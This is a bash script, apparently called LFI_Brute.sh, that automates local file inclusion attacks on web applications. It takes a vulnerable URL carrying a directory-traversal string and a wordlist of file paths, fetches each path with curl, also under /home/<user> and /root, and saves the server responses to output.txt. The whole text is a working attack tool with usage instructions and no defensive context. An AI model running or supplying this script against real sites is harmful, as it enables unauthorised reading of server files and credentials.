#!/bin/bash

if [ $# = 2 ] ; then
	url=$1
	wordList=$2
	echo "Give a username (default none):"
	read user
	if [ "$user" != "" ]; then	
		for word in `cat $wordList`
		do
#			echo "Tring $url/home/$user$word"
#			echo
			curl -s -L "$url/home/$user$word" > output.txt
		done
	else
		for word in `cat $wordList`
		do
#			echo "Tring $url$word"
#			echo
			curl -s -L $url$word >> output.txt
#			echo "Tring $url/root$word"
#			echo
			curl -s -L "$url/root$word" >> output.txt
		done
	fi
	echo "GO! Check you output.txt"
	echo "Recommend this command if you terminal mess up:"
	echo '		cat output.txt |grep -v "<"'
	echo "Make sure you have removed the file: 'output.txt' before you run this script next time!"
	echo "If the url is Vulnerable and there just little bit info even no info that should be the privilege not allow, try to impove you wordlist!"
else
	echo "Usage: $0 <url> <wordlist>"
	echo "   ex: ./LFI_Brute.sh 'VulnURL?Vulnparameter=../../../../../../../../../../../../' wordlist.txt"
fi
